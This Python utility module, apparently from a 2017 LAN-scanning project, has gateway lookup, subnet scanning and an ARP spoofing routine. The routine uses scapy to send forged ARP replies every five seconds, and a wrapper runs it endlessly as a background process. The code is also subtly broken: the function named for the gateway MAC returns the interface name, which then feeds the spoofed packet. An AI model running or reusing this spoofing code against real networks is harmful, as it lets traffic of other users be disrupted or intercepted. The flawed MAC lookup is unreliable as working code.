#coding:utf8
import os,re
import logging
import logging.config
import codecs
import time
import sys
import socket
import fcntl
import struct
import multiprocessing
import netifaces
from NetWork import *
from scapy.all import ARP,send

'''
logging.basicConfig(level=logging.ERROR,
                    filename='../log/log1.txt',
                    filemode='w+',
                    format='%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s')
'''
'''
@Author:linhos
@Time:2017/3/16
工具类，对网络的操作
'''
class NetTools:
    def __init__(self):
        pass


    @staticmethod
    def getGateway_ip():
        """
        :return: 网关IP
        """
        '''
        t = os.popen('route -n')
        for i in t:
            if i.startswith('0.0.0.0'):
                return re.split("\s+",i)[1]
        '''
        gateIp=netifaces.gateways()['default'][netifaces.AF_INET][0]
        return gateIp


    @staticmethod
    def getGateway_mac():
        """
        :return: 网关MAC 地址
        """
        logger=logging.getLogger("base")
        interface=netifaces.gateways()['default'][netifaces.AF_INET][1]
        return interface
        '''
        ip=NetTools.getGateway_ip()
        t=os.popen('arp -e %s'%ip)
        for i in t:
            if i.startswith(ip):
                return re.split("\s+",i)[2]
        '''


    @staticmethod
    def search_with_gateway():
        '''
        :return: 局域网查询IP String 类型
        '''
        gateIP=NetTools.getGateway_ip()
        gateIP=gateIP[:gateIP.rfind('.')]+'.1/24'
        return gateIP


    @staticmethod
    def __ARP_attract(dirIp):
        '''
        ARP欺骗，每个５秒发送一次
        :param dirIp: 欺骗的目的ip
        :return: null
        '''
        gateway_ip=NetTools.getGateway_ip()
        gateway_mac=NetTools.getGateway_mac()
        arp = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=dirIp)
        while 1:
            send(arp)
            time.sleep(5)

    @staticmethod
    def ARP_attract_with_Process(dirIp):
        '''
        进行arp欺骗，需要持续进行，因此需要单独开一个进程
        :param dirIp: 　目的ip
        :return: 进程的PID
        '''
        p=multiprocessing.Process(target=NetTools.__ARP_attract,args=(dirIp,))
        p.start()
        return p.pid

    @staticmethod
    def get_ip_address(ifname):
        '''
        查询本机ip地址
        :param ifname: 网卡名称
        :return: 　本机IP地址
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15])
        )[20:24])

    @staticmethod
    def get_interface():
         return netifaces.gateways()['default'][netifaces.AF_INET][1]








'''
查询局域网主机和MAC地址
'''
if __name__=="__main__":
    #logging.config.fileConfig(codecs.open("../log/logconfig.ini",'r','utf-8'))
    NetTools.getGateway_mac()
    local_work=NetTools.search_with_gateway()
    scanner_internet(local_work)
    sys.exit(0)









